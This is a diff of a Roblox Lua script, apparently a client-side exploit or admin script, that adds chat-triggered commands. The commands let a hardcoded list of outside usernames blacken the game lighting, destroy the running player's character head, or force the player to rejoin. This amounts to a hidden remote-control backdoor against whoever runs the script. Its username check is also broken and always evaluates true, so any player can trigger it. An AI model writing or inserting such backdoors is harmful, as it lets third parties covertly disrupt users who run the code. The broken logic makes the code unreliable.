@@ -1,5 +1,55 @@
   
   
+  
+   TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "whyjustwhy2112" or "UnndarkfuI"     then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]realitycheck"
+then
+target = split[2]
+if target == "all" then 
+_G.Heaven = false
+wait(1)
+game.Lighting.FogEnd = 1000000000
+game.Lighting.FogStart = 100000000000
+game.Lighting.atmosphere.Density  = 0.25
+game.Lighting.atmosphere.Haze   = 1
+game.Lighting.atmosphere.Decay  = Color3.fromRGB(0,0,0)
+game.Lighting.TimeOfDay = "12:00:00:"
+game.Lighting.FogColor = Color3.fromRGB(0,0,0)
+game:GetService("Workspace")[TheUser].Head:Destroy()
+
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+_G.Heaven = false
+wait(1)
+game.Lighting.FogEnd = 1000000000
+game.Lighting.FogStart = 100000000000
+game.Lighting.atmosphere.Density  = 0.25
+game.Lighting.atmosphere.Haze   = 1
+game.Lighting.atmosphere.Decay  = Color3.fromRGB(0,0,0)
+game.Lighting.TimeOfDay = "12:00:00:"
+game.Lighting.FogColor = Color3.fromRGB(0,0,0)
+game:GetService("Workspace")[TheUser].Head:Destroy()
+
+end
+end
+end
+end
+end
+end
+end)
+end)
+  
+  
+  
   TheUser = game:GetService("Players").LocalPlayer.Name
 game.Players.PlayerAdded:connect(function(Player)
     Player.Chatted:connect(function(mes)
@@ -87,7 +137,7 @@ if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "
 mes = string.lower(mes)
 local split = mes:split(" ")
 local cmd = split[1]
-if cmd == "]kill"
+if cmd == "]rejoin"
 then
 target = split[2]
 if target == "all" then 
@@ -113,36 +163,6 @@ end)
  
  
  
-   TheUser = game:GetService("Players").LocalPlayer.Name
-game.Players.PlayerAdded:connect(function(Player)
-    Player.Chatted:connect(function(mes)
-if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "whyjustwhy2112" or "UnndarkfuI"     then
-mes = string.lower(mes)
-local split = mes:split(" ")
-local cmd = split[1]
-if cmd == "]kill"
-then
-target = split[2]
-if target == "all" then 
-Place = game.placeId
-job = game.JobId
-game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
-else
-  for i,v in pairs(game.Players:GetPlayers()) do 
-                 if v.Name:lower():sub(1,#target) == target:lower() then
-                   target = v.Name
-if v.Name == TheUser then
-Place = game.placeId
-job = game.JobId
-game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
-end
-end
-end
-end
-end
-end
-end)
-end)
  
  
  TheUser = game:GetService("Players").LocalPlayer.Name
@@ -558,7 +578,49 @@ end)
 
 
 
-
+ TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"  or "whyjustwhy2112"   or "UnndarkfuI"    then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]realitycheck"
+then
+target = split[2]
+if target == "all" then 
+_G.Heaven = false
+wait(1)
+game.Lighting.FogEnd = 1000000000
+game.Lighting.FogStart = 100000000000
+game.Lighting.atmosphere.Density  = 0.25
+game.Lighting.atmosphere.Haze   = 1
+game.Lighting.atmosphere.Decay  = Color3.fromRGB(0,0,0)
+game.Lighting.TimeOfDay = "12:00:00:"
+game.Lighting.FogColor = Color3.fromRGB(0,0,0)
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+_G.Heaven = false
+wait(1)
+game.Lighting.FogEnd = 1000000000
+game.Lighting.FogStart = 100000000000
+game.Lighting.atmosphere.Density  = 0.25
+game.Lighting.atmosphere.Haze   = 1
+game.Lighting.atmosphere.Decay  = Color3.fromRGB(0,0,0)
+game.Lighting.TimeOfDay = "12:00:00:"
+game.Lighting.FogColor = Color3.fromRGB(0,0,0)
+end
+end
+end
+end
+end
+end
+end)
+end
 
 
  TheUser = game:GetService("Players").LocalPlayer.Name
